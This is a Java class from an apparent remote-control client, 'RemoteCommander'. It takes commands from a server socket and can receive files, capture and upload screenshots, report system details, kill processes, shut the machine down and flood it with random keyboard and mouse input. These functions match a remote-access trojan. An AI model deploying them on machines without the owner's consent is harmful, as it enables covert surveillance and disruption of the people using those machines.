package com.github.connorf.RemoteCommander;

import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.ClipboardOwner;
import java.awt.datatransfer.StringSelection;
import java.awt.datatransfer.Transferable;
import java.awt.event.InputEvent;
import java.awt.event.KeyEvent;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.Socket;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Random;

import static com.github.connorf.RemoteCommander.CommandConstants.*;

/**
 * contains the definitions and some implementations (if they are not OS specific) of the features of the program
 */
public abstract class CommandSet implements ClipboardOwner
{
    /** the runtime environment for the host OS, used for OS specific commands */
    private Runtime runtime = Runtime.getRuntime();
    /** path to the OS specific temp directory (where we store transferred files etc.) */
    private String tempPath;
    /** provides lots of useful functions */
    private Robot robot;
    /** output to the server */
    private DataOutputStream outToServer;
    /** input from the server */
    private DataInputStream inFromServer;

    private static final int MAJOR_VERSION = 0;
    private static final int MINOR_VERSION = 4;

    public abstract void eject() throws IOException;
    public abstract void shutdown() throws IOException;
    public abstract void restart() throws IOException;
    public abstract void rotate(String direction) throws IOException;
    public abstract void takeCameraPicture();
    public abstract boolean setWallpaper(File wallpaper);
    public abstract void minimise();
    public abstract String getRunningProcesses() throws IOException;
    public abstract boolean killProcess(String processName); // killing by name will kill all processes with that name
    public abstract boolean killProcess(int pid); // killing by pid will only kill that specified process

    public CommandSet(Socket connection)
    {
        createStorageDir();
        try
        {
            robot = new Robot();
            inFromServer = new DataInputStream(connection.getInputStream());
            outToServer = new DataOutputStream(connection.getOutputStream());
        }
        catch(AWTException awte)
        {
            System.err.println("Fatal error creating a robot");
            awte.printStackTrace();
        }
        catch(IOException ioe)
        {
            System.err.println("Something went wrong creating the output/input streams from the socket provided");
            ioe.printStackTrace();
        }
    }

    /**
     * creates a temp directory to store transferred files (from the server) on the clients machine
     */
    private void createStorageDir()
    {
        tempPath = System.getProperty("java.io.tmpdir") + File.separator + "rc" + File.separator;
        new File(tempPath).mkdir();
    }

    /**
     * retrieves a file sent from the server to us
     * @param size the size of the file to retrieve in bytes
     * @param prefix the prefix name the file should have
     * @param suffix the suffix of the name of the file (must be a file extension to work with windows)
     * @return the file retrieved from the server
     * @throws IOException if something went wrong reading the file from the stream
     */
    public File getFileFromServer(int size, String prefix, String suffix) throws IOException
    {
        File fileFromServer = File.createTempFile(prefix, suffix, new File(tempPath));
        byte[] buffer = new byte[size];

        FileOutputStream fos = new FileOutputStream(fileFromServer);
        System.out.println("Before readFully: File: " + fileFromServer.getName() + " with size: " + size);
        inFromServer.readFully(buffer, 0, size);
        fos.write(buffer, 0, size);
        fos.flush();
        System.out.println("After readFully: Size: " + fileFromServer.length());
        fos.close();

        System.out.println("Done file transfer");
        return fileFromServer;
    }

    /**
     * for sending data on the clients machine back to the server. e.g. screenshots
     * @param toSend the file that needs to be sent
     * @throws IOException if something went wrong sending the file
     */
    public void sendFile(File toSend) throws IOException
    {
        byte[] buffer = new byte[(int)toSend.length()];
        InputStream sendMe = new FileInputStream(toSend);

        outToServer.writeInt((int) toSend.length());
        int count;
        int sentBytes = 0;
        while(sentBytes != toSend.length() && (count = sendMe.read(buffer)) > 0)
        {
            sentBytes += count;
            outToServer.write(buffer, 0, count);
        }

        outToServer.flush();
        sendMe.close();
    }

    public void sendAllImages() //todo: refactor
    {
        File[] allImages = new File(tempPath).listFiles();

        try
        {
            int numOfImages = 0;
            for(File file : allImages)
            {
                if(file.getName().endsWith(".jpg"))
                    numOfImages++;
            }
            outToServer.writeInt(numOfImages);
        }
        catch(IOException ioe)
        {
            System.err.println("Failed creating connection to server to send files");
        }

        for(File file : allImages)
        {
            if(file.getName().endsWith(".jpg"))
            {
                try
                {
                    sendFile(file);
                    file.delete();
                }
                catch(IOException ioe)
                {
                    ioe.printStackTrace();
                }
            }
        }
    }

    /**
     * gets the command string sent from the server
     * @return the command the server sent, null if something went wrong reading the stream
     */
    public String getCommandFromServer()
    {
        String serverCommand = null;
        try
        {
            int commandLength = inFromServer.readInt();
            byte[] commandBytes = new byte[commandLength];
            inFromServer.readFully(commandBytes, 0, commandLength);
            serverCommand = new String(commandBytes);
        }
        catch(IOException ioe)
        {
            System.err.println("Something went wrong reading the command from the server");
            ioe.printStackTrace();
        }

        return serverCommand;
    }

    /**
     * returns a string with this clients system info, including username, jre arch, java version, client version, desktop environment, etc...
     * @return string containing all useful system info
     */
    public String getSysInfo()
    {
        String sysinfo = "OS       : " + System.getProperty("os.name") + "\nJRE arch : " + System.getProperty("os.arch") + "\nJava     : " + System.getProperty("java.version") + "\nClient   : " + MAJOR_VERSION + "." + MINOR_VERSION + "\nUsername : " + System.getProperty("user.name") + "\nLanguage : " + System.getProperty("user.language") + "\nCountry  : " + System.getProperty("user.country") + "\nDesktop  : " + System.getProperty("sun.desktop");
        return sysinfo;
    }

    /**
     * sends a string to the server
     * @param toSend the string to send
     */
    public void sendStringToServer(String toSend)
    {
        try
        {
            outToServer.writeInt(toSend.length());
            outToServer.write(toSend.getBytes(), 0, toSend.length());
        }
        catch(IOException ioe)
        {
            System.err.println("Something went wrong sending the command to the server.");
            ioe.printStackTrace();
        }
    }

    public void retrieve()
    {
    }

    /**
     * needed for the ClipboardOwner interface. We don't care if we lose ownership of the clipboard
     * @param aClipboard
     * @param aContents
     */
    @Override
    public void lostOwnership(Clipboard aClipboard, Transferable aContents)
    {
    }

    /**
     * "types" the given message on the clients machine. Instead of typing each character it uses the systems clipboard
     * to copy and paste the message
     * @param message the message to type out
     * @throws AWTException if something went wrong creating the robot
     */
    public void type(String message) throws AWTException
    {
        Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
        StringSelection stringSelection = new StringSelection(message);
        clipboard.setContents(stringSelection, this);

        robot.keyPress(KeyEvent.VK_CONTROL);
        robot.keyPress(KeyEvent.VK_V);
        robot.keyRelease(KeyEvent.VK_V);
        robot.keyRelease(KeyEvent.VK_CONTROL);
    }

    /**
     * shows a message box on the clients screen
     * @param message the msg to be displayed in the msg box
     */
    public void showMessage(String message, String title, String type)
    {
        int option = JOptionPane.NO_OPTION;
        switch(type)
        {
            case MSG_TYPE_ERROR:
                option = JOptionPane.ERROR_MESSAGE;
                break;
            case MSG_TYPE_INFO:
                option = JOptionPane.INFORMATION_MESSAGE;
                break;
            case MSG_TYPE_WARN:
                option = JOptionPane.WARNING_MESSAGE;
                break;
            case MSG_TYPE_QUESTION:
                option = JOptionPane.QUESTION_MESSAGE;
                break;
        }

        JOptionPane.showMessageDialog(null, message, title, option);
    }

    /**
     * takes a screenshot of the clients screen and saves it in our temp directory
     * @throws IOException if something went wrong created the image file from the bufferedimage
     */
    public void takeScreenshot() throws IOException
    {
        Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        BufferedImage screenImg = robot.createScreenCapture(new Rectangle(screenSize));
        DateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd@HH-mm-ss");
        File screenshot = new File(getTempPath() + "/scr_" + dateFormat.format(new Date()) + ".jpg");
        ImageIO.write(screenImg, "jpg", screenshot);
    }

    /**
     * randomly presses keys, moves the mouse and clicks mouse buttons on the clients computer
     * @param length the time in ms the random actions should last for
     * @param delay the time delay in ms between each random action
     */
    public void chaos(long length, long delay)
    {
        long start = System.currentTimeMillis();
        Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        Random random = new Random();
        KeyCode keyCode = new KeyCode();
        while(System.currentTimeMillis() - start < length)
        {
            try
            {
                int key = keyCode.randomKeyCode();
                System.out.println("Using keycode: " + key);
                robot.keyPress(key);
                robot.keyRelease(key);
                robot.mouseMove(random.nextInt(screenSize.width), random.nextInt(screenSize.height));
                switch(random.nextInt(3))
                {
                    case 0:
                        robot.mousePress(InputEvent.BUTTON1_DOWN_MASK);
                        robot.mouseRelease(InputEvent.BUTTON1_DOWN_MASK);
                        break;
                    case 1:
                        robot.mousePress(InputEvent.BUTTON2_DOWN_MASK);
                        robot.mouseRelease(InputEvent.BUTTON2_DOWN_MASK);
                        break;
                    case 2:
                        robot.mousePress(InputEvent.BUTTON3_DOWN_MASK);
                        robot.mouseRelease(InputEvent.BUTTON3_DOWN_MASK);
                        break;
                }
                Thread.sleep(delay);
            }
            catch(InterruptedException ie)
            {
            }
        }
    }

    /**
     * finds if the process exec() created returned successfully or not
     * @param process the process to check its return value
     * @return true if the process exited successfully, false otherwise
     */
    public boolean wasSuccessful(Process process)
    {
        return process.exitValue() == RETURN_SUCCESS;
    }

    public Runtime getRuntime()
    {
        return runtime;
    }

    public String getTempPath()
    {
        return tempPath;
    }

    public Robot getRobot()
    {
        return robot;
    }
}